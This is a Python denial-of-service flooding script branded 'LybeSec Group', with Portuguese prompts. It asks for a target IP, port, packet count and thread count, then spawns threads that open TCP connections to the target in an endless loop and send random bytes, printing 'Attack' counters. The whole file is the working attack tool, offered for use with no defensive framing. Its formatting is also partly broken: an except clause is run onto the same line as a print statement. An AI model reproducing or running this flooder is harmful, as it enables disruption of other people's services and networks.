import os
import time
import socket
import threading
import random
import progressbar
from colorama import init, Fore, Back, Style
init(autoreset=True)

os.system("clear||cls")

print("""
                \033[94m [ \033[0m \033[1;37;41mLybeSec Group\033[0m \033[94m ] \033[0m
██▓   ▓██   ██▓ ▄▄▄▄   ▓█████   ██████ ▓█████  ▄████▄
▓██▒    ▒██  ██▒▓█████▄ ▓█   ▀ ▒██    ▒ ▓█   ▀ ▒██▀ ▀█
▒██░     ▒██ ██░▒██▒ ▄██▒███   ░ ▓██▄   ▒███   ▒▓█    ▄
▒██░     ░ ▐██▓░▒██░█▀  ▒▓█  ▄   ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
░██████▒ ░ ██▒▓░░▓█  ▀█▓░▒████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
░ ▒░▓  ░  ██▒▒▒ ░▒▓███▀▒░░ ▒░ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
░ ░ ▒  ░▓██ ░▒░ ▒░▒   ░  ░ ░  ░░ ░▒  ░ ░ ░ ░  ░  ░  ▒
  ░ ░   ▒ ▒ ░░   ░    ░    ░   ░  ░  ░     ░   ░
    ░  ░░ ░      ░         ░  ░      ░     ░  ░░ ░
        ░ ░           ░                        ░        """)
print('\033[1;37;41mCodded By: CharseSec\033[0m - \033[1;37;41mLybeSec Group\033[0m')
print("\033[97m╔═════════════════════════════╗")
ip = str(input("\033[1;37;41mIP Alvo\033[0m : "))
print("\033[97m----------------------------")
port = int(input("\033[1;37;41mPorta\033[0m : "))
print("\033[97m----------------------------")
packs = int(input("\033[1;37;41mPacotes\033[0m : "))
print("\033[97m----------------------------")
thread = int(input("\033[1;37;41mThreads\033[0m : "))
print("\033[97m╚═════════════════════════════╝ ")


def animated_marker():
    widgets = ['\033[94m[\033[97m#\033[94m]\033[97mLoading: ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()

    for i in range(50):
        time.sleep(0.1)
        bar.update(i)

animated_marker()

def start():
  r = random._urandom(10)
  u = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(r)
      for i in range(packs):
        s.send(r)
        u += 1
        print(f"LybeSec " +str(u)+ " <-- Attack " +ip+ " -->")                                                                                                    except:
      s.close()
      print('\033[1;37;41mFlooding Done!\033[0')

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()